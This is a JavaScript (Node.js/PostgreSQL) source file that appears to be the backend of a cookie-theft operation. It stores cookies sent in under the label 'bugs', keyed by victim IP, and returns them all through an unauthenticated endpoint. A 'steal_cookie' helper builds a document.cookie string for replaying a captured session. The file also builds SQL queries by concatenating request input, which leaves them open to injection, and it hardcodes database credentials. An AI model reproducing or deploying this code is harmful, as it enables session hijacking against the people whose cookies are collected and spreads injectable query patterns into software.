const { Pool } = require('pg');

const credentials = {
    user: 'me',
    host: 'localhost',
    database: 'api',
    password: 'password',
    port: 5432,
}

const pool = new Pool(credentials);

const current_time = () => {
  return new Date(Date.now()).toISOString().replace('T',' ').replace('Z','')
}

const steal_cookie = (name, path, value) => {
  return "document.cookie = \"" + name+ '=' + value + "; path="+path + "\""
}

const createDatabase = (request, response) => {
    pool.query('DROP TABLE IF EXISTS bugs;', (error, results) => {
        if (error) {
            throw error
        }
    })

  const createDatabaseString = `
    CREATE TABLE IF NOT EXISTS "bugs" (
	    "id" SERIAL,
      "timestamp_col" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
      "user_ip" VARCHAR(30),
	    "bug_name" VARCHAR(500) NOT NULL,
      "bug_value" TEXT NOT NULL,
      "bug_domain" VARCHAR(500) NOT NULL,
      "bug_path" VARCHAR(100) NOT NULL,
	    PRIMARY KEY ("id")
    );`;

    pool.query(createDatabaseString, [], (error, results) => {
        if (error) {
            throw error;
        }
        response.status(200).send(`Database created!`)
    })
}

const clearDatabase = (request, response) => {
    pool.query('DROP TABLE IF EXISTS bugs;', (error, results) => {
        if (error) {
            throw error
        }
        response.status(200).send(`Cleared Database!`)

    })
}

const createBug = (request, response) => {
    // response.status(201).send(`Bug added: ${request.query.bug}`)
    const bug = JSON.parse(request.query.bug);

    const user_ip = request.ip || request.connection.remoteAddress;

    where_clause = "user_ip='" + user_ip +
        "' AND bug_name='" + bug.name +
        "' AND bug_domain='" + bug.domain +
        "' AND bug_path='" + bug.path + "'"

    query = "SELECT * FROM bugs WHERE " + where_clause

    pool.query(query, (err, result) => {

        // TODO: check for existing entry and update

        // response.status(201).send(query+ result)

        if (result == undefined || result.rowCount == 0) {

            pool.query('INSERT INTO bugs (user_ip, bug_name, bug_value, bug_domain, bug_path, timestamp_col) VALUES ($1, $2, $3, $4, $5, $6)',
                [user_ip, bug.name, bug.value, bug.domain, bug.path, current_time()],

                (error, results) => {

                    if (error) {
                        response.status(400).send(error)
                        return;
                    }

                    response.status(201).send(`Bug added: ${[user_ip, bug.name, bug.value, bug.domain, bug.path, new Date()]}`) // TODO: Remove this later

                })

        } else {

            pool.query('UPDATE bugs SET bug_value=\'' + bug.value + '\', timestamp_col=\'' + current_time() + '\' WHERE ' + where_clause,

                (error, results) => {

                    if (error) {
                        // throw error
                        response.status(400).send(error);
                        return;

                    }

                    response.status(201).send(`Bug updated: ${[user_ip, bug.name, bug.value, bug.domain, bug.path, new Date()]}`) // TODO: Remove this later

                })

        }

    })

}

const getAllBugs = (request, response) => {
    pool.query('SELECT * FROM bugs', (error, results) => {
        if (error) {
            // throw error
            response.status(400).send(error)
            return;
        }
        response.status(200).json(results.rows)
    })
}



module.exports = { createBug, getAllBugs, clearDatabase, createDatabase };
